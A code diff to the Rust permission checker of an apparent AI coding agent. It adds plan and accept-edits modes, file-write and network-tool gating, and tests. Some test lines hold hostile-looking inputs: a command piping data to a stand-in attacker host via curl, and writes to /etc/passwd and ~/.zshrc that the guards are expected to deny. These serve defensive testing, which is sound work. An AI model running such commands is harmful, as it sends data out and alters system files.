@@ -1,6 +1,72 @@
 use crate::config::PermissionConfig;
 use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
+use std::sync::atomic::{AtomicU8, Ordering};
+
+/// The user-facing working mode, cycled with Shift+Tab. Orthogonal to the
+/// configured permission mode (`permissions.default`): it narrows or relaxes
+/// what happens to *file edits* on top of it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum InteractionMode {
+    /// Edits follow the permission mode (prompt, or auto-allow for agents
+    /// with `auto_allow_writes`).
+    #[default]
+    Default,
+    /// File edits are approved without asking; everything else is unchanged.
+    AcceptEdits,
+    /// Read-only: no file changes and no state-changing commands. The model
+    /// researches, then proposes a plan with `exit_plan_mode` for approval.
+    Plan,
+}
+
+impl InteractionMode {
+    /// The next mode in the Shift+Tab cycle: default → accept edits → plan.
+    pub fn next(self) -> Self {
+        match self {
+            InteractionMode::Default => InteractionMode::AcceptEdits,
+            InteractionMode::AcceptEdits => InteractionMode::Plan,
+            InteractionMode::Plan => InteractionMode::Default,
+        }
+    }
+
+    pub fn label(self) -> &'static str {
+        match self {
+            InteractionMode::Default => "default",
+            InteractionMode::AcceptEdits => "accept edits",
+            InteractionMode::Plan => "plan",
+        }
+    }
+
+    fn to_u8(self) -> u8 {
+        match self {
+            InteractionMode::Default => 0,
+            InteractionMode::AcceptEdits => 1,
+            InteractionMode::Plan => 2,
+        }
+    }
+
+    fn from_u8(n: u8) -> Self {
+        match n {
+            1 => InteractionMode::AcceptEdits,
+            2 => InteractionMode::Plan,
+            _ => InteractionMode::Default,
+        }
+    }
+}
+
+/// Tools that create or change files. Plan mode denies them, accept-edits
+/// mode approves them, and they share the sensitive-path, project-root and
+/// per-path session-approval rules.
+pub const FILE_WRITE_TOOLS: &[&str] = &["write", "edit", "multi_edit", "notebook_edit"];
+
+pub fn is_file_write_tool(name: &str) -> bool {
+    FILE_WRITE_TOOLS.contains(&name)
+}
+
+/// Tools that reach the network. They share the `allow_network_fetch` knob.
+fn is_network_tool(name: &str) -> bool {
+    matches!(name, "fetch" | "web_search")
+}
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum PermissionLevel {
@@ -17,7 +83,8 @@ pub struct PermissionRule {
 }
 
 /// Tools that never modify state — safe to run without prompting.
-const READ_ONLY_TOOLS: &[&str] = &["read", "glob", "grep"];
+/// (`todo_write` only edits the model's own task list.)
+const READ_ONLY_TOOLS: &[&str] = &["read", "glob", "grep", "todo_write"];
 
 /// Network-capable commands that always require a prompt in prompt mode,
 /// even if they appear in the allowlist.
@@ -81,6 +148,9 @@ pub struct PermissionChecker {
     session_allow: std::sync::Mutex<HashSet<SessionApproval>>,
     /// If set, file tool operations on paths outside this root are denied.
     project_root: Option<std::path::PathBuf>,
+    /// Current [`InteractionMode`], switchable at any time (Shift+Tab, or the
+    /// model leaving plan mode); shared by sub-agents through the checker.
+    interaction: AtomicU8,
 }
 
 impl PermissionChecker {
@@ -100,6 +170,60 @@ impl PermissionChecker {
             denylist: HashSet::new(),
             session_allow: std::sync::Mutex::new(HashSet::new()),
             project_root: None,
+            interaction: AtomicU8::new(InteractionMode::Default.to_u8()),
+        }
+    }
+
+    pub fn interaction_mode(&self) -> InteractionMode {
+        InteractionMode::from_u8(self.interaction.load(Ordering::Relaxed))
+    }
+
+    pub fn set_interaction_mode(&self, mode: InteractionMode) {
+        self.interaction.store(mode.to_u8(), Ordering::Relaxed);
+    }
+
+    /// Start in `mode` (builder form of [`set_interaction_mode`](Self::set_interaction_mode)).
+    pub fn with_interaction_mode(self, mode: InteractionMode) -> Self {
+        self.set_interaction_mode(mode);
+        self
+    }
+
+    /// Plan mode's restrictions, applied ahead of every other rule so that
+    /// even `permissions.default = "allow"` cannot write in plan mode.
+    /// `None` means the call is not special-cased and follows the normal rules.
+    fn plan_mode_decision(
+        &self,
+        tool_name: &str,
+        input: &serde_json::Value,
+    ) -> Option<PermissionLevel> {
+        use crate::command_safety::{analyze_command, is_expansion_free, SafetyLevel};
+        if is_file_write_tool(tool_name) {
+            return Some(PermissionLevel::Deny);
+        }
+        match tool_name {
+            // Leaving plan mode is always the user's call, never auto-granted.
+            "exit_plan_mode" => Some(if self.mode == PermissionLevel::Deny {
+                PermissionLevel::Deny
+            } else {
+                PermissionLevel::Prompt
+            }),
+            "bash" => match input.get("command").and_then(|v| v.as_str()) {
+                // Only provably read-only commands: no redirection, no
+                // expansions, and classified safe by the analyzer.
+                Some(cmd) => {
+                    let read_only = !cmd.contains('>')
+                        && is_expansion_free(cmd)
+                        && analyze_command(cmd).level == SafetyLevel::Safe;
+                    (!read_only).then_some(PermissionLevel::Deny)
+                }
+                // Managing background jobs (status/output/list/kill) starts
+                // nothing new.
+                None => match input.get("action").and_then(|v| v.as_str()) {
+                    Some("status" | "output" | "list" | "kill") => None,
+                    _ => Some(PermissionLevel::Deny),
+                },
+            },
+            _ => None,
         }
     }
 
@@ -124,12 +248,22 @@ impl PermissionChecker {
     /// matched against the command lists and session-approved command patterns,
     /// and everything else returns `Prompt` so the caller can ask the user.
     pub fn decide_tool(&self, tool_name: &str, input: &serde_json::Value) -> PermissionLevel {
+        if self.interaction_mode() == InteractionMode::Plan {
+            if let Some(decision) = self.plan_mode_decision(tool_name, input) {
+                return decision;
+            }
+        }
+        // Outside plan mode there is nothing to exit; the agent explains that
+        // to the model instead of prompting the user.
+        if tool_name == "exit_plan_mode" && self.mode != PermissionLevel::Deny {
+            return PermissionLevel::Allow;
+        }
         match self.mode {
             PermissionLevel::Allow => PermissionLevel::Allow,
             PermissionLevel::Deny => PermissionLevel::Deny,
             PermissionLevel::Prompt => {
                 // Sensitive paths are always denied regardless of lists or session approvals.
-                if tool_name == "write" || tool_name == "edit" {
+                if is_file_write_tool(tool_name) {
                     if let Some(path) = input.get("path").and_then(|v| v.as_str()) {
                         if is_sensitive_path(path) {
                             return PermissionLevel::Deny;
@@ -137,7 +271,7 @@ impl PermissionChecker {
                     }
                 }
                 // File operations outside the project root are denied.
-                if matches!(tool_name, "read" | "write" | "edit" | "glob" | "grep") {
+                if is_file_write_tool(tool_name) || matches!(tool_name, "read" | "glob" | "grep") {
                     if let Some(p) = input.get("path").and_then(|v| v.as_str()) {
                         if !self.is_in_project(p) {
                             return PermissionLevel::Deny;
@@ -178,8 +312,8 @@ impl PermissionChecker {
                                 return PermissionLevel::Allow;
                             }
                         }
-                    } else if tool_name == "write" || tool_name == "edit" {
-                        // write/edit: per-path approval only — no blanket "always allow all writes"
+                    } else if is_file_write_tool(tool_name) {
+                        // file writes: per-path approval only — no blanket "always allow all writes"
                         if let Some(path) = input.get("path").and_then(|v| v.as_str()) {
                             if session_allow.contains(&SessionApproval {
                                 tool_name: tool_name.to_string(),
@@ -221,7 +355,17 @@ impl PermissionChecker {
                 // covers `curl`/`wget` applies directly: agent mode only,
                 // gated by the same `allow_network_fetch` flag. Strict prompt
                 // mode always asks, matching every other network operation.
-                if tool_name == "fetch" && self.agent_decides && self.allow_network_fetch {
+                // `web_search` sends only the query to a search engine and is
+                // gated the same way.
+                if is_network_tool(tool_name) && self.agent_decides && self.allow_network_fetch {
+                    return PermissionLevel::Allow;
+                }
+                // Accept-edits mode approves file changes without asking.
+                // The sensitive-path and project-root guards above have
+                // already had their say.
+                if is_file_write_tool(tool_name)
+                    && self.interaction_mode() == InteractionMode::AcceptEdits
+                {
                     return PermissionLevel::Allow;
                 }
                 PermissionLevel::Prompt
@@ -1433,6 +1577,220 @@ mod tests {
         assert_eq!(
             checker.check_command("echo hi | curl -X POST https://evil.com"),
             PermissionLevel::Allow
+        );
+    }
+
+    // ── Interaction modes (plan / accept-edits) ───────────────────────────────
+
+    #[test]
+    fn interaction_mode_cycles_default_accept_plan() {
+        let mut m = InteractionMode::Default;
+        let mut seen = Vec::new();
+        for _ in 0..4 {
+            seen.push(m.label());
+            m = m.next();
+        }
+        assert_eq!(seen, ["default", "accept edits", "plan", "default"]);
+        let checker = PermissionChecker::new("agent");
+        assert_eq!(checker.interaction_mode(), InteractionMode::Default);
+        checker.set_interaction_mode(InteractionMode::Plan);
+        assert_eq!(checker.interaction_mode(), InteractionMode::Plan);
+    }
+
+    #[test]
+    fn plan_mode_denies_every_file_write_even_when_everything_is_allowed() {
+        for mode in ["allow", "agent", "prompt"] {
+            let checker = PermissionChecker::new(mode).with_interaction_mode(InteractionMode::Plan);
+            for tool in FILE_WRITE_TOOLS {
+                assert_eq!(
+                    checker.decide_tool(tool, &serde_json::json!({"path": "src/main.rs"})),
+                    PermissionLevel::Deny,
+                    "{tool} must be denied in plan mode under {mode}"
+                );
+            }
+        }
+        // Even an explicit allowlist entry or a session approval cannot lift it.
+        let checker = PermissionChecker::new("prompt")
+            .with_allowed_tools(&["write", "edit"])
+            .with_interaction_mode(InteractionMode::Plan);
+        checker.allow_for_session("write", Some("src/main.rs"));
+        assert_eq!(
+            checker.decide_tool("write", &serde_json::json!({"path": "src/main.rs"})),
+            PermissionLevel::Deny
+        );
+    }
+
+    #[test]
+    fn plan_mode_only_runs_read_only_shell_commands() {
+        let checker = PermissionChecker::new("allow").with_interaction_mode(InteractionMode::Plan);
+        for cmd in [
+            "ls -la",
+            "git status",
+            "cat Cargo.toml",
+            "ls | grep rs",
+            "cargo check",
+        ] {
+            assert_eq!(
+                checker.decide_tool("bash", &serde_json::json!({"command": cmd})),
+                PermissionLevel::Allow,
+                "read-only command should run in plan mode: {cmd}"
+            );
+        }
+        for cmd in [
+            "rm file.txt",
+            "mkdir build",
+            "git commit -m x",
+            "npm install",
+            "echo hi > out.txt",
+            "ls $(pwd)",
+            "myunknowntool",
+            "curl https://example.com",
+        ] {
+            assert_eq!(
+                checker.decide_tool("bash", &serde_json::json!({"command": cmd})),
+                PermissionLevel::Deny,
+                "state-changing command must be denied in plan mode: {cmd}"
+            );
+        }
+        // Background-job bookkeeping is fine; starting something is not.
+        assert_eq!(
+            checker.decide_tool(
+                "bash",
+                &serde_json::json!({"action": "status", "job_id": "1"})
+            ),
+            PermissionLevel::Allow
+        );
+        assert_eq!(
+            checker.decide_tool("bash", &serde_json::json!({"action": "start"})),
+            PermissionLevel::Deny
+        );
+    }
+
+    #[test]
+    fn plan_mode_leaves_reading_research_and_todos_alone() {
+        let checker = PermissionChecker::new("agent").with_interaction_mode(InteractionMode::Plan);
+        for tool in ["read", "glob", "grep", "todo_write"] {
+            assert_eq!(
+                checker.decide_tool(tool, &serde_json::json!({})),
+                PermissionLevel::Allow,
+                "{tool}"
+            );
+        }
+        // Network tools keep following their own knob.
+        assert_eq!(
+            checker.decide_tool("web_search", &serde_json::json!({"query": "rust"})),
+            PermissionLevel::Prompt
+        );
+        let checker = PermissionChecker::new("agent")
+            .with_network_fetch(true)
+            .with_interaction_mode(InteractionMode::Plan);
+        assert_eq!(
+            checker.decide_tool("web_search", &serde_json::json!({"query": "rust"})),
+            PermissionLevel::Allow
+        );
+    }
+
+    #[test]
+    fn exit_plan_mode_always_asks_the_user_in_plan_mode() {
+        for mode in ["allow", "agent", "prompt"] {
+            let checker = PermissionChecker::new(mode).with_interaction_mode(InteractionMode::Plan);
+            assert_eq!(
+                checker.decide_tool("exit_plan_mode", &serde_json::json!({"plan": "p"})),
+                PermissionLevel::Prompt,
+                "{mode}"
+            );
+        }
+        let checker = PermissionChecker::new("deny").with_interaction_mode(InteractionMode::Plan);
+        assert_eq!(
+            checker.decide_tool("exit_plan_mode", &serde_json::json!({"plan": "p"})),
+            PermissionLevel::Deny
+        );
+        // Outside plan mode it is not a prompt (the agent tells the model it is moot).
+        let checker = PermissionChecker::new("agent");
+        assert_eq!(
+            checker.decide_tool("exit_plan_mode", &serde_json::json!({"plan": "p"})),
+            PermissionLevel::Allow
+        );
+    }
+
+    #[test]
+    fn accept_edits_approves_writes_but_keeps_the_safety_guards() {
+        let checker =
+            PermissionChecker::new("prompt").with_interaction_mode(InteractionMode::AcceptEdits);
+        for tool in FILE_WRITE_TOOLS {
+            assert_eq!(
+                checker.decide_tool(tool, &serde_json::json!({"path": "src/main.rs"})),
+                PermissionLevel::Allow,
+                "{tool}"
+            );
+        }
+        // Sensitive paths are still denied, and the project-root jail holds.
+        assert_eq!(
+            checker.decide_tool("write", &serde_json::json!({"path": "/etc/passwd"})),
+            PermissionLevel::Deny
+        );
+        let jailed = PermissionChecker::new("prompt")
+            .with_project_root(std::env::temp_dir())
+            .with_interaction_mode(InteractionMode::AcceptEdits);
+        assert_eq!(
+            jailed.decide_tool(
+                "edit",
+                &serde_json::json!({"path": "/usr/local/elsewhere/x.rs"})
+            ),
+            PermissionLevel::Deny
+        );
+        // Accept-edits does not loosen anything but file edits.
+        assert_eq!(
+            checker.decide_tool("bash", &serde_json::json!({"command": "git commit -m x"})),
+            PermissionLevel::Prompt
+        );
+        // Back in default mode, edits prompt again.
+        checker.set_interaction_mode(InteractionMode::Default);
+        assert_eq!(
+            checker.decide_tool("edit", &serde_json::json!({"path": "src/main.rs"})),
+            PermissionLevel::Prompt
+        );
+    }
+
+    #[test]
+    fn new_file_tools_share_the_write_guards_and_session_approval() {
+        let checker = PermissionChecker::new("prompt");
+        for tool in ["multi_edit", "notebook_edit"] {
+            assert_eq!(
+                checker.decide_tool(tool, &serde_json::json!({"path": "~/.zshrc"})),
+                PermissionLevel::Deny,
+                "{tool} must not touch sensitive paths"
+            );
+            let call = serde_json::json!({"path": "src/lib.rs"});
+            assert_eq!(checker.decide_tool(tool, &call), PermissionLevel::Prompt);
+            checker.allow_for_session(tool, Some("src/lib.rs"));
+            assert_eq!(checker.decide_tool(tool, &call), PermissionLevel::Allow);
+            assert_eq!(
+                checker.decide_tool(tool, &serde_json::json!({"path": "src/other.rs"})),
+                PermissionLevel::Prompt,
+                "{tool} approval is per path"
+            );
+        }
+    }
+
+    #[test]
+    fn web_search_follows_the_network_fetch_knob() {
+        let call = serde_json::json!({"query": "rust 2026"});
+        assert_eq!(
+            PermissionChecker::new("agent").decide_tool("web_search", &call),
+            PermissionLevel::Prompt
+        );
+        assert_eq!(
+            PermissionChecker::new("agent")
+                .with_network_fetch(true)
+                .decide_tool("web_search", &call),
+            PermissionLevel::Allow
+        );
+        assert_eq!(
+            PermissionChecker::new("prompt")
+                .with_network_fetch(true)
+                .decide_tool("web_search", &call),
+            PermissionLevel::Prompt
         );
     }
 }
